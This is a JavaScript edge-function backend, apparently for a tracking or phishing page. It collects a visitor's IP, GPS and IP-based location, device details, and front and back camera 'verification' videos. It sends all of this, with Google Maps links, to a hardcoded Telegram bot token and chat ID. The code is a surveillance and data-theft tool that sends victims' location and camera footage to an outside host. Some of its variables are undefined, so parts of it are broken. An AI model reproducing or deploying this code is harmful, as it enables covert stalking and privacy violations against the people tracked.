export const config = { runtime: "edge" };

export default async function handler(req) {
  const TOKEN = "8962152623:AAH2gxqS-QXfs_bYaHHwoPG6xv7pWJXLSmY";
  const CHAT_ID = 8523959891;
  
  if (req.method !== "POST")
    return new Response("Method Not Allowed", { status: 405 });

  try {
    const userIP =
      req.headers.get("x-forwarded-for")?.split(",")[0] || 
      req.headers.get("cf-connecting-ip") ||
      req.headers.get("x-real-ip") ||
      "Unknown";
    
    let geo = {};
    let ipLat = 0;
    let ipLon = 0;
    
    try {
      const geoRes = await fetch(`https://freeipapi.com/api/json/${userIP}`);
      geo = await geoRes.json();
      ipLat = geo.latitude || 0;
      ipLon = geo.longitude || 0;
    } catch (e) {
      geo = {};
    }

    const contentType = req.headers.get("content-type") || "";
    let clientData = {};
    let formData = null;
    let gpsLat = 0;
    let gpsLon = 0;

    if (contentType.includes("multipart/form-data")) {
      formData = await req.formData();
      clientData = JSON.parse(formData.get("clientInfo") || "{}");
      gpsLat = parseFloat(clientData.lat) || 0;
      gpsLon = parseFloat(clientData.lon) || 0;
    } else {
      clientData = await req.json();
      gpsLat = parseFloat(clientData.lat) || 0;
      gpsLon = parseFloat(clientData.lon) || 0;
    }

    const hasFront = formData && formData.has("front");
    const hasBack = formData && formData.has("back");

    const finalLat = gpsLat !== 0 ? gpsLat : ipLat;
    const finalLon = gpsLon !== 0 ? gpsLon : ipLon;
    const lat = finalLat || 0;
    const lon = finalLon || 0;
    
    const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;

    // 2. Link short (dạng @)
    const googleMapsShort = `https://maps.google.com/?q=${lat},${lon}`;
    // 5. Link với tên địa điểm (nếu có)
    let locationName = '';
    if (geo.cityName && geo.countryName) {
      locationName = `${geo.cityName}, ${geo.countryName}`;
    } else if (geo.regionName) {
      locationName = geo.regionName;
    }
    const googleMapsName = locationName ? 
      `https://www.google.com/maps/place/${encodeURIComponent(locationName)}/@${lat},${lon},15z` :
      googleMapsPlace;
    
    // 6. Link dạng @ với zoom
    const googleMapsZoom = `https://www.google.com/maps/@${lat},${lon},15z`;

    const finalCaption = `
📡 [THÔNG TIN TRUY CẬP & VIDEO XÁC THỰC]

🕒 Thời gian: ${clientData.time || new Date().toLocaleString("vi-VN")}
📱 Thiết bị: ${clientData.device || "Unknown"}
🖥️ Hệ điều hành: ${clientData.os || "Unknown"}
🌍 IP dân cư: ${userIP}
🏢 ISP: ${geo.asName || "VNNIC"}
🏙️ Địa chỉ: ${address}

📍 Vĩ độ (GPS): ${gpsLat !== 0 ? gpsLat : 'Không có'}
📍 Kinh độ (GPS): ${gpsLon !== 0 ? gpsLon : 'Không có'}
📍 Vĩ độ (IP): ${ipLat || 0}
📍 Kinh độ (IP): ${ipLon || 0}
📍 Vĩ độ (Sử dụng): ${lat}
📍 Kinh độ (Sử dụng): ${lon}
🎯 Độ chính xác GPS: ${clientData.accuracy || 'Không có'}m

🗺️ Google Maps (Full): ${googleMapsFull}
📍 Google Maps (Short): ${googleMapsShort}
📍 Google Maps (Place): ${googleMapsPlace}
📍 Google Maps (Zoom 15): ${googleMapsZoom}
📍 Google Maps (Tên): ${googleMapsName}
📌 Google Maps (Embed): ${googleMapsEmbed}

🎙️ Microphone: ${clientData.microphone || '❌ Không có quyền'}
🎥 Video trước: ${hasFront ? '✅ Có' : '❌ Không'}
🎥 Video sau: ${hasBack ? '✅ Có' : '❌ Không'}

⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
`.trim();

    console.log('📤 Bắt đầu gửi lên Telegram...');
    console.log(`📍 Tọa độ: ${lat}, ${lon}`);
    console.log(`🗺️ Google Maps Short: ${googleMapsShort}`);

    if (hasFront || hasBack) {
      if (hasFront) {
        const frontFile = formData.get("front");
        const frontForm = new FormData();
        frontForm.append("chat_id", CHAT_ID);
        frontForm.append("video", frontFile);
        frontForm.append("caption", finalCaption);
        frontForm.append("supports_streaming", "true");

        await fetch(
          `https://api.telegram.org/bot${TOKEN}/sendVideo`,
          {
            method: "POST",
            body: frontForm,
          }
        );
      }

      if (hasBack) {
        const backFile = formData.get("back");
        const backForm = new FormData();
        backForm.append("chat_id", CHAT_ID);
        backForm.append("video", backFile);
        backForm.append("supports_streaming", "true");

        await fetch(
          `https://api.telegram.org/bot${TOKEN}/sendVideo`,
          {
            method: "POST",
            body: backForm,
          }
        );
      }

      return new Response(JSON.stringify({ success: true }), { 
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      });
      
    } else {
      const res = await fetch(
        `https://api.telegram.org/bot${TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: finalCaption,
          }),
        },
      );
      return new Response(await res.text(), { status: 200 });
    }
  } catch (err) {
    console.error('❌ Lỗi:', err);
    return new Response(JSON.stringify({ error: err.message }), {
      status: 500,
    });
  }
}
